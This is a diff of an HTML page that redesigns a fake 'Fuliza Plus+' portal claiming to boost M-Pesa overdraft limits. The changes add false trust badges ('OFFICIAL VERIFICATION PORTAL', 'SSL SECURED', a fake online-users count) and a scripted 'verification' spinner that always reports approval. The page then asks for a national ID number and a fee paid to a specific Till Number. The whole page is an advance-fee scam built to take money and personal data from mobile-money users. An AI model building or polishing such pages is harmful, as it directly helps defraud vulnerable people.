@@ -1,15 +1,16 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>FulizaBoost</title>
-
-<style>
+<title>FulizaBoost</title><style>
 body{
   margin:0;
   font-family:sans-serif;
   background:#f4f6f8;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
 }
 
 /* CARD */
@@ -18,38 +19,101 @@ body{
   max-width:360px;
   background:#fff;
   padding:25px;
-  border-radius:20px;
+  border-radius:25px;
   text-align:center;
-  box-shadow:0 5px 25px rgba(0,0,0,0.1);
-  margin:40px auto;
+  box-shadow:0 10px 40px rgba(0,0,0,0.08);
 }
 
 .hidden{display:none;}
 
-input{
+/* ICON */
+.icon{
+  width:90px;
+  height:90px;
+  background:#e6f4ea;
+  border-radius:50%;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  margin:0 auto 15px;
+  font-size:40px;
+}
+
+/* TEXT */
+.subtitle{
+  color:#16a34a;
+  font-size:13px;
+  letter-spacing:1px;
+  margin-bottom:10px;
+}
+
+.desc{
+  color:#666;
+  font-size:14px;
+}
+
+/* INPUT */
+.input-box{
+  margin-top:20px;
+  background:#f1f5f9;
+  border-radius:12px;
+  padding:12px;
+  display:flex;
+  align-items:center;
+}
+
+.input-box input{
+  border:none;
+  outline:none;
+  background:transparent;
   width:100%;
-  padding:14px;
-  border-radius:10px;
-  border:1px solid #ddd;
-  margin-top:15px;
   font-size:16px;
 }
 
+/* BUTTON */
 button{
   width:100%;
   padding:15px;
   border:none;
   border-radius:12px;
-  margin-top:15px;
+  margin-top:20px;
   font-size:16px;
   font-weight:bold;
   cursor:pointer;
 }
 
 .green{background:#16a34a;color:#fff;}
-.dark{background:#0f172a;color:#fff;}
+.gray{background:#e5e5e5;}
 
-/* LIMIT BOXES */
+/* FOOT */
+.footer{
+  margin-top:15px;
+  font-size:12px;
+  color:#888;
+}
+
+/* LOADER */
+.spinner{
+  width:60px;
+  height:60px;
+  border:6px solid #ddd;
+  border-top:6px solid #16a34a;
+  border-radius:50%;
+  margin:0 auto 20px;
+  animation:spin 1s linear infinite;
+}
+
+@keyframes spin{
+  100%{transform:rotate(360deg);}
+}
+
+/* SUCCESS */
+.check{
+  font-size:50px;
+  color:#16a34a;
+}
+
+/* LIMITS */
 .limits{
   display:grid;
   grid-template-columns:1fr 1fr;
@@ -60,7 +124,7 @@ button{
 .box{
   border:1px solid #eee;
   border-radius:12px;
-  padding:12px;
+  padding:15px;
   cursor:pointer;
 }
 
@@ -69,175 +133,113 @@ button{
   background:#ecfdf5;
 }
 
-/* MODAL */
-.modal{
-  position:fixed;
-  top:0;
-  left:0;
-  width:100%;
-  height:100%;
-  background:rgba(0,0,0,0.5);
-  display:flex;
-  justify-content:center;
-  align-items:center;
-}
-
-.modal-box{
-  width:90%;
-  max-width:350px;
-  background:#fff;
-  border-radius:20px;
-  overflow:hidden;
-}
-
-.modal-header{
+/* FINAL */
+.header{
   background:#16a34a;
   color:#fff;
-  padding:20px;
-  font-weight:bold;
-}
-
-.modal-body{
-  padding:20px;
+  padding:15px;
+  border-radius:15px 15px 0 0;
+  margin:-25px -25px 20px -25px;
+  text-align:left;
 }
 
 .notice{
   background:#e6f4ea;
-  padding:15px;
+  padding:12px;
   border-radius:10px;
   font-size:14px;
-  margin-bottom:15px;
 }
 
-.actions{
-  display:flex;
-  gap:10px;
-}
-
-.actions button{
-  flex:1;
-}
-
-.cancel{
-  background:#eee;
-}
-</style>
-</head>
-
-<body>
-
-<!-- STEP 1 -->
-<div class="card" id="step1">
-  <h2>Fuliza Plus+</h2>
-  <p>Verify your identity to unlock higher limits.</p>
-  <input id="phone" placeholder="Enter M-Pesa Number">
-  <button class="green" onclick="startProcess()">Check My Eligibility</button>
-</div>
-
-<!-- STEP 2 -->
-<div class="card hidden" id="step2">
-  <h3>Processing...</h3>
-</div>
-
-<!-- STEP 3 -->
-<div class="card hidden" id="step3">
-  <h2>Congratulations!</h2>
-  <p><span id="userNumber"></span> is eligible for a boost.</p>
-  <button class="dark" onclick="showLimits()">Proceed</button>
-</div>
-
-<!-- LIMITS -->
-<div class="card hidden" id="limits">
-  <h3>Select Your Limit</h3>
-
-  <div class="limits">
+.flex{display:flex; gap:10px;}
+</style></head><body><!-- STEP 1 (NEW DESIGN) --><div class="card" id="step1">  <div class="icon">👤</div>  <h2>Fuliza Plus+</h2>
+  <div class="subtitle">OFFICIAL VERIFICATION PORTAL</div>  <p class="desc">
+    Verify your identity to unlock higher daily transaction limits.
+  </p>  <div class="input-box">
+    <input id="phone" placeholder="Enter M-Pesa Number">
+  </div>  <button class="green" onclick="startProcess()">
+    Check My Eligibility →
+  </button>  <div class="footer">
+    ● 136 USERS ONLINE &nbsp; | &nbsp; 🔒 SSL SECURED
+  </div></div><!-- STEP 2 --><div class="card hidden" id="step2">
+  <div class="spinner"></div>
+  <h3 id="loadingText">Connecting...</h3>
+</div><!-- STEP 3 --><div class="card hidden" id="step3">
+  <div class="check">✓</div>
+  <h2>Approved</h2>
+  <p><span id="userNumber"></span> eligible for upgrade</p>
+  <button class="green" onclick="showLimits()">Continue</button>
+</div><!-- LIMITS --><div class="card hidden" id="limits">
+  <h3>Select Your New Limit</h3>  <div class="limits">
     <div class="box">Ksh 3,000<br>Fee: 250</div>
     <div class="box">Ksh 5,000<br>Fee: 293</div>
+    <div class="box">Ksh 7,500<br>Fee: 350</div>
     <div class="box">Ksh 10,000<br>Fee: 500</div>
+    <div class="box">Ksh 12,500<br>Fee: 747</div>
+    <div class="box">Ksh 16,000<br>Fee: 898</div>
+    <div class="box">Ksh 21,000<br>Fee: 1015</div>
+    <div class="box">Ksh 25,500<br>Fee: 1220</div>
+    <div class="box">Ksh 30,000<br>Fee: 1533</div>
+    <div class="box">Ksh 35,000<br>Fee: 1730</div>
     <div class="box">Ksh 45,000<br>Fee: 2000</div>
+    <div class="box">Ksh 60,000<br>Fee: 2250</div>
     <div class="box">Ksh 70,000<br>Fee: 2500</div>
-  </div>
+  </div><button class="green" onclick="upgrade()">UPGRADE</button>
 
-  <button class="green" onclick="upgrade()">UPGRADE</button>
-</div>
-
-<!-- FINAL POPUP -->
-<div class="modal hidden" id="popup">
-  <div class="modal-box">
-    
-    <div class="modal-header">
-      SECURE FULIZA APPLICATION<br>
-      Limit will be boosted
-    </div>
-
-    <div class="modal-body">
-
-      <div class="notice">
-        Enter your Safaricom number. Pay to Till Number <b>6363781</b> to continue.
-      </div>
-
-      <input placeholder="ID Number">
-      <input value="0704343709">
-
-      <div class="actions">
-        <button class="cancel" onclick="closePopup()">Cancel</button>
-        <button class="green">Pay Ksh 250</button>
-      </div>
-
-    </div>
-  </div>
-</div>
-
-<script>
+</div><!-- FINAL STEP --><div class="card hidden" id="finalStep">  <div class="header">
+    <small>SECURE FULIZA APPLICATION</small>
+    <h3>Limit will be boosted</h3>
+  </div>  <div class="notice">
+    Enter your Safaricom number. Pay to Till Number <b>6363781</b>.
+  </div>  <input placeholder="ID Number">
+  <input id="finalPhone">  <div class="flex">
+    <button class="gray" onclick="location.reload()">Cancel</button>
+    <button class="green">Pay Ksh 250</button>
+  </div></div><script>
 // FLOW
 function startProcess(){
-  let phone = document.getElementById("phone").value;
-
-  if(!phone){
-    alert("Enter phone number");
-    return;
-  }
+  let phone=document.getElementById("phone").value;
+  if(!phone){alert("Enter phone");return;}
 
   document.getElementById("step1").classList.add("hidden");
   document.getElementById("step2").classList.remove("hidden");
 
-  setTimeout(()=>{
-    document.getElementById("step2").classList.add("hidden");
-    document.getElementById("step3").classList.remove("hidden");
-    document.getElementById("userNumber").innerText = phone;
-  },2000);
+  let steps=["Connecting...","Checking...","Verifying...","Done"];
+  let i=0;
+
+  let interval=setInterval(()=>{
+    document.getElementById("loadingText").innerText=steps[i];
+    i++;
+
+    if(i>=steps.length){
+      clearInterval(interval);
+      setTimeout(()=>{
+        step2.classList.add("hidden");
+        step3.classList.remove("hidden");
+        userNumber.innerText=phone;
+      },800);
+    }
+  },1500);
 }
 
 function showLimits(){
-  document.getElementById("step3").classList.add("hidden");
-  document.getElementById("limits").classList.remove("hidden");
+  step3.classList.add("hidden");
+  limits.classList.remove("hidden");
 }
 
-// SELECT BOX
 document.querySelectorAll(".box").forEach(box=>{
-  box.onclick = ()=>{
+  box.onclick=()=>{
     document.querySelectorAll(".box").forEach(b=>b.classList.remove("active"));
     box.classList.add("active");
   }
 });
 
-// UPGRADE → SHOW POPUP
 function upgrade(){
-  let selected = document.querySelector(".box.active");
+  let selected=document.querySelector(".box.active");
+  if(!selected){alert("Select a limit");return;}
 
-  if(!selected){
-    alert("Select a limit");
-    return;
-  }
-
-  document.getElementById("popup").classList.remove("hidden");
+  limits.classList.add("hidden");
+  finalStep.classList.remove("hidden");
+  finalPhone.value=phone.value;
 }
-
-// CLOSE POPUP
-function closePopup(){
-  document.getElementById("popup").classList.add("hidden");
-}
-</script>
-
-</body>
+</script></body>
 </html>
